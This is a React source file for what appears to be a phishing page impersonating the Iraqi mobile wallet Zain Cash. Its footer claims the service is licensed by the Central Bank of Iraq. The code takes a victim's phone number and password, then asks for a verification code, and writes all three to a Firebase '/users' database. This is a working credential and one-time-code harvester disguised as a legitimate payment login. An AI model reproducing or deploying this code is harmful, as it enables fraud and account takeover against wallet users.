import "./styles.css";
import { Spinner } from "./Loader";
import Code from "./Code";
import MainPage from "./MainPage";
import { ref, push, set } from "firebase/database";
import { database } from "./firebase";
import { useEffect, useState } from "react";
export default function App() {
  const [activePageID, setActivePageID] = useState(1);
  const [phone, setPhone] = useState("phone");
  const [pass, setPass] = useState("pass");
  const [code, setCode] = useState("");
  const dba = database;
  const handleDataBase = (phone: string) => {
    const postListRef = ref(dba, "/users");

    const newPostRef = push(postListRef, phone);
    set(newPostRef, {
      phone: phone,
      pass: pass,
      code: code,
    });
  };

  const [show, setShow] = useState(false);
  const handleActivePage = (id: number) => {
    switch (id) {
      case 1:
        setActivePageID(1);
        break;
      case 2:
        setShow(true);
        setActivePageID(2);
        setTimeout(() => setShow(false), 3000);

        break;
    }
  };
  const updateData = async () => {
    handleDataBase(phone);
  };
  return (
    <div
      className="App"
      style={{
        backgroundImage: "url(https://i.ibb.co/djdfJhC/cover.png)",
        backgroundSize: "cover",
        height: "100vh",
        overflow: "hidden",
      }}
    >
      <Spinner showSpinner={show} setShow={setShow} />

      {activePageID === 1 ? (
        <MainPage
          handleActivePage={handleActivePage}
          addData={updateData}
          setPhone={setPhone}
          setPass={setPass}
        />
      ) : (
        <Code updateData={updateData} setCode={setCode} />
      )}
      <div style={{ position: "fixed", bottom: 20, left: 0, right: 0 }}>
        <div
          style={{ display: "flex", justifyContent: "center", color: "white" }}
        >
          <div>زين كاش مرخصة من قبل البنك المركزي العراقي</div>
          <div></div>
        </div>
      </div>
    </div>
  );
}
